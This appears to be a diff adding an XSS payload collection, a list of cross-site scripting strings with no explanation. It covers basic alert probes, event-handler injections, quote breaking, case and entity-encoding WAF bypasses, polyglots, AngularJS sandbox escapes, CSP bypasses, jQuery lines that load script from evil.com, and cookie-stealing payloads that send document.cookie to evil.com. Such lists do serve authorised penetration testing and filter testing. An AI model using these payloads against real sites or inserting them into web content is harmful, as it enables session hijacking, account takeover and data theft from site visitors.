@@ -1,0 +1,151 @@
+# XSS Payload Collection
+# Basic, Advanced, and WAF Bypass Payloads
+
+# Basic Alert Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+
+# HTML Tag Payloads
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<command onmouseover=alert(1)>
+
+# Event Handler Variations
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)//
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<body onscroll=alert(1)>
+<body onresize=alert(1)>
+<body onhashchange=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<button onclick=alert(1)>Click
+<div onclick=alert(1)>Click
+<a onclick=alert(1)>Click
+<a href=javascript:alert(1)>Click
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>Click
+
+# Quote Breaking
+'-alert(1)-'
+"-alert(1)-"
+';alert(1);//
+";alert(1);//
+</script><script>alert(1)</script>
+'></script><script>alert(1)</script>
+"></script><script>alert(1)</script>
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+\"-alert(1)//
+
+# WAF Bypass Techniques
+<scRipT>alert(1)</scRipT>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(1)</script>
+<script >alert(1)</script>
+<script%20>alert(1)</script>
+<script%09>alert(1)</script>
+<script%0a>alert(1)</script>
+<script%0d>alert(1)</script>
+<script/x>alert(1)</script>
+<script/anything>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<a href="javascripT:alert(1)">Click</a>
+<a href="jAvAsCrIpT:alert(1)">Click</a>
+<a href="javascript&#58;alert(1)">Click</a>
+<a href="javascript&#x3A;alert(1)">Click</a>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+<img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=alert&#x28;1&#x29;>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+# Polyglot Payloads
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+
+# DOM XSS Payloads
+#javascript:alert(1)
+javascript://%0aalert(1)
+javascript://anything%0D%0A%0d%0aalert(1)
+#-alert(1)
+#alert(1)
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+
+# AngularJS Payloads
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+{{[].push.constructor('alert(1)')()}}
+{{[].fill.constructor('alert(1)')()}}
+
+# jQuery Payloads
+$.getScript('//evil.com/xss.js')
+$.get('//evil.com/xss.js')
+$.post('//evil.com/xss.js')
+jQuery.getScript('//evil.com/xss.js')
+
+# Data Exfiltration Payloads
+<script>fetch('https://evil.com/?cookie='+document.cookie)</script>
+<script>new Image().src='https://evil.com/?cookie='+document.cookie</script>
+<script>document.write('<img src="https://evil.com/?cookie='+document.cookie+'">')</script>
+<script>window.location='https://evil.com/?cookie='+document.cookie</script>
+<img src=x onerror="fetch('https://evil.com/?cookie='+btoa(document.cookie))">
+<svg onload="fetch('https://evil.com/?cookie='+document.cookie)">
+
+# CSP Bypass Payloads
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="data:text/html,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Rare/Exotic Payloads
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<object onerror=alert(1)>
+<applet onerror=alert(1)>
+<bgsound onerror=alert(1)>
+<blink onerror=alert(1)>
+<isindex onerror=alert(1)>
+<multicol onerror=alert(1)>
+<nextid onerror=alert(1)>
+<noembed onerror=alert(1)>
+<plaintext onerror=alert(1)>
+<spacer onerror=alert(1)>
+<xmp onerror=alert(1)>
+
+# DOM-Based Payloads
+javascript:domxssExecutionSink(1,{toString:function(){return 1}})
+javascript:window.onerror=alert;throw 1
+javascript:valueOf=alert;window+''
+javascript:valueOf=alert;1+{}
+javascript:valueOf=alert;''+{}
